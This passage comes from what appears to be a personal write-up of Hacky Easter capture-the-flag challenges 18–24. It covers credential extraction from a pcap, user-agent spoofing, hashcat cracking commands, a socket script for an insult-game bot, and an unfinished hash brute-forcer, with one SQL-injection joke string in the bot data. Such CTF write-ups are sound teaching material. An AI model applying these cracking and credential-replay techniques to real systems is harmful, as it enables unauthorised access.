        <img src="http://i.imgur.com/0iAoovp.jpg" />
    
    
</figure>


<p>Now the QR code is in the left eye, and a target shape in the right. The target
needs to be used to invert the pixels in the QR code. Once done, snap the code
and move on.</p>

<h1 id="challenge-18:00aa8d5840836b6803fb0a2203b66750">Challenge 18</h1>

<p>Once we visit the site we get asked to authenticate. No doubt the details will be in
the pcap file, so let&rsquo;s open that. We can see a failed auth followed by a successful
one. Inspect the relevant packet and we get the login:</p>


<figure >
    
        <img src="http://i.imgur.com/dhLNYS9.png" />
    
    
</figure>


<p>Using this to login we are presented with another login form. Trying the same
credentials gives a &ldquo;Payment required&rdquo; page. Heading back to the pcap file let&rsquo;s
see if we can&rsquo;t find some details for this part too. Ah, right there at the bottom.</p>


<figure >
    
        <img src="http://i.imgur.com/Gp45s1R.png" />
    
    
</figure>


<p>This time however we need to pass the hash and login details via POST. Either
edit the form, or use a tool like Zap or Burp proxy, to add this data to the POST
and we have our egg.</p>

<h1 id="challenge-19:00aa8d5840836b6803fb0a2203b66750">Challenge 19</h1>

<p>Not found.</p>

<p>I will add a solution here later.</p>

<h1 id="challenge-20:00aa8d5840836b6803fb0a2203b66750">Challenge 20</h1>

<p>The big clue here is robots. Why do we love robots? <code>robots.txt</code> is why. Taking a
look at it I can see</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">User-agent: EasterBot
Disallow: /
Allow: /hackyeaster/bots/bots.

User-agent: *
Disallow: /
</pre></div>


<p>Visiting the url <code>/hackyeaster/bots/bots.html</code> takes me to the CP30 Wiki page. That can&rsquo;t be right. So I decided
to spoof my user agent to be <code>EasterBot</code> and I get a different result. An image
with the following text</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">BAMA WABOKI PISAL FATATU FOMU WOSEBI SEJU SOWU SEJU - BAMAS MUFE WAFUB FOMU MOWEWE
</pre></div>


<p>Hrmm. I tried to decipher this many ways before I gave up and Googled it. It turns
out this is actually <a href="http://roila.org/language-guide/vocabulary/">ROILA</a> and
comes with a nice dictionary. So I set about translating it and got:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">you must make word of addition two and two - this be name of page
</pre></div>


<p>Right, so I add two and two to give four and I load up
<code>http://hackyeaster.hacking-lab.com//hackyeaster/bots/four.html</code> and see Gir with the
word <code>MetAE</code>. Well meta can only mean I need to look at the page metadata. Viewing the source
I see</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&lt;meta</span> <span style="color: #a6e22e">name=</span><span style="color: #e6db74">&quot;description&quot;</span> <span style="color: #a6e22e">content=</span><span style="color: #e6db74">&quot;Robots talk in ROILA language: eman egap eht esrever tsum&quot;</span><span style="color: #f92672">&gt;</span>
<span style="color: #f92672">&lt;meta</span> <span style="color: #a6e22e">name=</span><span style="color: #e6db74">&quot;keywords&quot;</span> <span style="color: #a6e22e">content=</span><span style="color: #e6db74">&quot;secret, page, robots, fun, hacky easter, blrt, five, beep&quot;</span><span style="color: #f92672">&gt;</span>
</pre></div>


<p>More ROILA? No, it&rsquo;s just backwards english. I&rsquo;ll just go to
<code>http://hackyeaster.hacking-lab.com//hackyeaster/bots/ruof.html</code> and get the egg/</p>

<h1 id="challenge-21:00aa8d5840836b6803fb0a2203b66750">Challenge 21</h1>

<p>I am told that <code>blue</code> is <code>110</code>. I took a guess that therefore red will be <code>011</code> and
green <code>101</code>. Basically the binary represents the RGB values inverted. Applying this
I wrote a script to translate the colours to a binary string and then conver that to ASCII
which gave me the egg&rsquo;s URL.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #75715e">#!/bin/env python</span>
<span style="color: #f92672">from</span> <span style="color: #f8f8f2">PIL</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">Image</span>

<span style="color: #f8f8f2">codes</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[</span><span style="color: #e6db74">&#39;111&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;110&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;101&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;100&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;011&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;010&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;001&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;000&#39;</span><span style="color: #f8f8f2">]</span>

<span style="color: #f8f8f2">im</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">Image</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&#39;conycode.png&#39;</span><span style="color: #f8f8f2">)</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">/</span><span style="color: #ae81ff">14.0</span>
<span style="color: #f8f8f2">pixels</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">list(im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">getdata())</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">pixels[im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]]</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">pixels[im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span><span style="color: #f92672">+</span><span style="color: #f8f8f2">(</span><span style="color: #ae81ff">18</span> <span style="color: #f92672">*</span> <span style="color: #ae81ff">12</span><span style="color: #f8f8f2">)]</span>
<span style="color: #66d9ef">print</span>

<span style="color: #f8f8f2">output</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">[]</span>
<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">h</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">xrange(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">],</span> <span style="color: #ae81ff">18</span><span style="color: #f8f8f2">):</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">w</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">xrange(</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">],</span> <span style="color: #ae81ff">18</span><span style="color: #f8f8f2">):</span>
        <span style="color: #f8f8f2">output</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">append(codes[pixels[w</span> <span style="color: #f92672">+</span> <span style="color: #f8f8f2">(im</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">size[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">*</span> <span style="color: #f8f8f2">h)]])</span>

<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>

<span style="color: #f8f8f2">bin_string</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(output)</span>
<span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">len(bin_string)</span>
<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">x</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">xrange(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">len(bin_string),</span> <span style="color: #ae81ff">8</span><span style="color: #f8f8f2">):</span>
    <span style="color: #f8f8f2">t</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">int(bin_string[x:x</span><span style="color: #f92672">+</span><span style="color: #ae81ff">8</span><span style="color: #f8f8f2">],</span> <span style="color: #ae81ff">2</span><span style="color: #f8f8f2">)</span>
    <span style="color: #f8f8f2">ba</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">bytearray([t])</span>
    <span style="color: #f8f8f2">sys</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">stdout</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">write(str(ba))</span>
</pre></div>


<h1 id="challenge-22:00aa8d5840836b6803fb0a2203b66750">Challenge 22</h1>

<p>Hash cracking. I am new to this, but boy did I enjoy this challenge because I learned
a lot! I decided to use <a href="https://hashcat.net/oclhashcat/">hashcat</a> for all the hashes.</p>

<p>Let&rsquo;s begin:</p>

<h2 id="hash-1:00aa8d5840836b6803fb0a2203b66750">hash 1</h2>

<p>A 16 digit pin takes a long time to bruteforce, but the hint tells me that the only
numbers in the PIN are 1, 7, 9, and 0.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">hashcat -m100 -1 1790 --pw-min=16 --pw-max=16 -a3 hash1.txt ?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1?1
</pre></div>
</p>

<p>time taken: 4:40 minutes</p>

<h2 id="hash-2:00aa8d5840836b6803fb0a2203b66750">hash 2</h2>

<p>This one had me stumped for ages, because it was hard to bruteforce and hashcat didn&rsquo;t support
sha384. Luckily I found <a href="https://crackstation.net/">Crackstation</a> where I entered the hash
and was immediately rewarded with the correct answer. Alternatively writing a brute forcer in Python
and using the Rockyou wordlist would also have worked.</p>

<h2 id="hash-3:00aa8d5840836b6803fb0a2203b66750">hash 3</h2>

<p>Here I employed hashcat&rsquo;s <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">rule based attacks</a>
 to make myself a new wordlist based on the given rules.
First I needed to run the <code>toggle</code> rule to generate the words with one upper case char.
Then I ran a the substituion rule (which is the <code>leetspeak.rule</code>). Now I had a
list of words that had one substitution and one upper case letter. Only the
punctuation and digit missing now. For this step I wrote a python script
that would generate the required rule table:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f8f8f2">puncs</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;! @ # $ % ^ &amp; * ( ) _ + { } [ ] : ; . , / ? ~ `&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">split()</span>
<span style="color: #f8f8f2">nums</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;1 2 3 4 5 6 7 8 9 0&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">split()</span>

<span style="color: #f8f8f2">fh</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">open(</span><span style="color: #e6db74">&#39;pn.rule&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #e6db74">&#39;w&#39;</span><span style="color: #f8f8f2">)</span>


<span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">punc</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">puncs:</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">n</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">nums:</span>
        <span style="color: #f8f8f2">fh</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">write(</span><span style="color: #e6db74">&#39;$%s$%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(punc,</span> <span style="color: #f8f8f2">n))</span>
        <span style="color: #f8f8f2">fh</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">write(</span><span style="color: #e6db74">&#39;$%s$%s</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span> <span style="color: #f92672">%</span> <span style="color: #f8f8f2">(n,</span> <span style="color: #f8f8f2">punc))</span>

<span style="color: #f8f8f2">fh</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>
</pre></div>
</p>

<p>I then used this rule to run it over the word list, then</p>

<pre><code>hashcat -m0 hash3.txt final.txt
</code></pre>

<p>to get the plaintext in 3 seconds.</p>

<h2 id="hash-4:00aa8d5840836b6803fb0a2203b66750">hash 4</h2>

<p>Here I needed to run hashcat&rsquo;s combinator attack a few times on the word list.
What this does is append each word of a wordlist to every other word.
Running this a few times will give me the list I need:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">hashcat -a1 wordlist.txt --stdout &gt; pass1.txt
hashcat -a1 -m1400 hash4.txt pass1.txt
</pre></div>
</p>

<p>Scoop the plaintext in 8 minutes.</p>

<h1 id="challenge-23:00aa8d5840836b6803fb0a2203b66750">Challenge 23</h1>

<p>Once connected to the server I have to insult the bot quickly and smartly. But who is
smarter than the bot? No one that&rsquo;s who. Except perhaps the bot itself. In essence
what needs to be done is get the taunts from the master and play them back
to him. Then use his replies as respsonses to his taunts.</p>

<p>I figure there&rsquo;s two ways of doing this;</p>

<pre><code>1. Connect the bot to itself via a client that relays the messages between the two
2. Record the quips and play them back automatically as needed
</code></pre>

<p>I plumped for option 2 and hoped there wouldn&rsquo;t be too many quips to harvest. Having
played against the bot a few times I managed to get myself the list of comebacks and
wrote a Python script to pwn the Nerd Master</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">import</span> <span style="color: #f8f8f2">socket</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">random</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">re</span>


<span style="color: #f8f8f2">challs</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">{</span><span style="color: #e6db74">&#39;Pna lbh ernq guvf?&#39;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&#39;EBG13 vf sbe ynzref.&#39;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;You&#39;re so slow, you must have been written in BASIC.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;At least I don&#39;t have memory leaks like you.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;Go 127.0.0.1 to your mummy.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;go 127.0.0.1 to your mom&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;I have more friends than you.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Yeah, but only until you update your Facebook profile with a real picture of you!&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;You should leave your cave and socialize a bit.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;I&#39;m not anti-social. I&#39;m just not user friendly.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;This fight is like a hash function - it works in one direction only.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Too bad you picked LM hashing.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;I bet you don&#39;t even understand binary.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Sure I do. Me and you, we are 10 different kind of persons.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;1f u c4n r34d th1s u r s70p1d.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;You better check your spelling. Stoopid has two &#39;o&#39;s.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;After loosing to me, your life won&#39;t be the same anymore.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;A Life? Cool! Where can I download one of those?&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;You&#39;ll be 0xdeadbeef soon.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Not as long as I have my 0xcafebabe.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;Af7ter th1s f1gh7, I w1ll pwn ur b0x3n.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Check your settings - you seem to have chosen the Klingon keyboard layout.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;I have more friends than you.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Yeah, but only until you update your Facebook profile with a real picture of you!&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;I&#39;ll check you out - any last words?&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;svn:ignore&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;Tell me your name, hobo. I need to check your records.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;My name is bob&#39;; DROP TABLE VALJ;--&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;format C:&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Specified drive does not exist.&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;You must be jealous when seeing my phone&#39;s display.&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Not really - Your pixels are so big, some of them have their own region code!&quot;</span><span style="color: #f8f8f2">,</span>
          <span style="color: #e6db74">&quot;Ping! Anybody there?&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;ICMP type 3, code 13: Communication Administratively Prohibited&quot;</span>
          <span style="color: #f8f8f2">}</span>

<span style="color: #f8f8f2">tosends</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">challs</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">removekey</span><span style="color: #f8f8f2">(d,</span> <span style="color: #f8f8f2">key):</span>
    <span style="color: #f8f8f2">r</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">dict(d)</span>
    <span style="color: #66d9ef">del</span> <span style="color: #f8f8f2">r[key]</span>
    <span style="color: #66d9ef">return</span> <span style="color: #f8f8f2">r</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">sendchall</span><span style="color: #f8f8f2">(s,</span> <span style="color: #f8f8f2">chall):</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendall(challs[chall]</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\r</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">)</span>


<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">netcat</span><span style="color: #f8f8f2">(hostname,</span> <span style="color: #f8f8f2">port):</span>
    <span style="color: #66d9ef">global</span> <span style="color: #f8f8f2">tosends</span>
    <span style="color: #f8f8f2">s</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">socket(socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">AF_INET,</span> <span style="color: #f8f8f2">socket</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">SOCK_STREAM)</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">connect((hostname,</span> <span style="color: #f8f8f2">port))</span>
    <span style="color: #66d9ef">while</span> <span style="color: #ae81ff">1</span><span style="color: #f8f8f2">:</span>
        <span style="color: #f8f8f2">data</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">recv(</span><span style="color: #ae81ff">1024</span><span style="color: #f8f8f2">)</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f92672">not</span> <span style="color: #f8f8f2">data:</span>
            <span style="color: #66d9ef">continue</span>
        <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Received:&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">repr(data)</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">(data</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&quot;Speechless?</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&quot;</span> <span style="color: #f92672">or</span>
            <span style="color: #f8f8f2">data</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;Go play with your toys, yellow-belly.</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">):</span>
            <span style="color: #66d9ef">print</span> <span style="color: #f8f8f2">data</span>
            <span style="color: #66d9ef">break</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">data</span> <span style="color: #f92672">==</span> <span style="color: #e6db74">&#39;Do you feel brave enough to challenge the mighty nerdmaster? (y|n)</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">:</span>
            <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendall(</span><span style="color: #e6db74">&#39;y</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">)</span>
            <span style="color: #66d9ef">continue</span>

        <span style="color: #f8f8f2">m</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">re</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">search(</span><span style="color: #e6db74">&quot;.*YOUR TURN ----</span><span style="color: #ae81ff">\\</span><span style="color: #e6db74">n&quot;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">data)</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">m:</span>
            <span style="color: #f8f8f2">chal</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">tosends</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">keys()[random</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">randint(</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">len(tosends)</span><span style="color: #f92672">-</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">)]</span>
            <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">sendall(chal</span> <span style="color: #f92672">+</span> <span style="color: #e6db74">&#39;</span><span style="color: #ae81ff">\n</span><span style="color: #e6db74">&#39;</span><span style="color: #f8f8f2">)</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;send challenge: &#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">chal</span>
            <span style="color: #f8f8f2">tosends</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">removekey(tosends,</span> <span style="color: #f8f8f2">chal)</span>
            <span style="color: #66d9ef">continue</span>



        <span style="color: #f8f8f2">m</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">re</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">search(</span><span style="color: #e6db74">&#39;.*MY TURN ----</span><span style="color: #ae81ff">\\</span><span style="color: #e6db74">n(.*)</span><span style="color: #ae81ff">\\</span><span style="color: #e6db74">n&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">data)</span>
        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">m:</span>
            <span style="color: #f8f8f2">chal</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">m</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">groups()[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]</span>
            <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">chal</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">challs</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">keys():</span>
                <span style="color: #f8f8f2">sendchall(s,</span> <span style="color: #f8f8f2">chal)</span>
            <span style="color: #66d9ef">else</span><span style="color: #f8f8f2">:</span>
                <span style="color: #f8f8f2">challs[chal]</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span>
                <span style="color: #66d9ef">continue</span>
            <span style="color: #66d9ef">continue</span>

        <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;::::::&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">data</span>


    <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&quot;Connection closed.&quot;</span>
    <span style="color: #f8f8f2">s</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">close()</span>

<span style="color: #f8f8f2">nc</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">netcat(</span><span style="color: #e6db74">&#39;hackyeaster.hacking-lab.com&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #ae81ff">1400</span><span style="color: #f8f8f2">)</span>
</pre></div>
</p>

<h1 id="challenge-24:00aa8d5840836b6803fb0a2203b66750">Challenge 24</h1>

<p>Hrm, this really isn&rsquo;t a secure hash at all. A Python script can do this</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">from</span> <span style="color: #f8f8f2">Crypto.Hash</span> <span style="color: #f92672">import</span> <span style="color: #f8f8f2">MD2,</span> <span style="color: #f8f8f2">MD5,</span> <span style="color: #f8f8f2">SHA,</span> <span style="color: #f8f8f2">SHA256,</span> <span style="color: #f8f8f2">SHA512</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">itertools</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">string</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">os</span>
<span style="color: #f92672">import</span> <span style="color: #f8f8f2">sys</span>


<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">part_1</span><span style="color: #f8f8f2">():</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">gen:</span>
        <span style="color: #f8f8f2">word</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(p)</span>
        <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">MD2</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new()</span>
        <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">update(word)</span>
        <span style="color: #f8f8f2">hashed</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">hashed[:</span><span style="color: #ae81ff">6</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">target[</span><span style="color: #ae81ff">0</span><span style="color: #f8f8f2">]:</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[*] First part is:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">word</span>
            <span style="color: #66d9ef">return</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">part_2</span><span style="color: #f8f8f2">():</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">gen:</span>
        <span style="color: #f8f8f2">word</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(p)</span>
        <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">MD5</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new()</span>
        <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">update(word)</span>
        <span style="color: #f8f8f2">hashed</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">hashed[</span><span style="color: #ae81ff">6</span><span style="color: #f8f8f2">:</span><span style="color: #ae81ff">12</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">target[</span><span style="color: #ae81ff">1</span><span style="color: #f8f8f2">]:</span>
            <span style="color: #66d9ef">print</span> <span style="color: #e6db74">&#39;[*] Second part is:&#39;</span><span style="color: #f8f8f2">,</span> <span style="color: #f8f8f2">word</span>
            <span style="color: #66d9ef">return</span>

<span style="color: #66d9ef">def</span> <span style="color: #a6e22e">part_3</span><span style="color: #f8f8f2">():</span>
    <span style="color: #66d9ef">for</span> <span style="color: #f8f8f2">p</span> <span style="color: #f92672">in</span> <span style="color: #f8f8f2">gen:</span>
        <span style="color: #f8f8f2">word</span> <span style="color: #f92672">=</span> <span style="color: #e6db74">&#39;&#39;</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">join(p)</span>
        <span style="color: #f8f8f2">h</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">SHA</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">new()</span>
        <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">update(word)</span>
        <span style="color: #f8f8f2">hashed</span> <span style="color: #f92672">=</span> <span style="color: #f8f8f2">h</span><span style="color: #f92672">.</span><span style="color: #f8f8f2">hexdigest()</span>

        <span style="color: #66d9ef">if</span> <span style="color: #f8f8f2">hashed[</span><span style="color: #ae81ff">12</span><span style="color: #f8f8f2">:</span><span style="color: #ae81ff">18</span><span style="color: #f8f8f2">]</span> <span style="color: #f92672">==</span> <span style="color: #f8f8f2">target[</span><span style="color: #ae81ff">2</span><span style="color: #f8f8f2">]:</span>
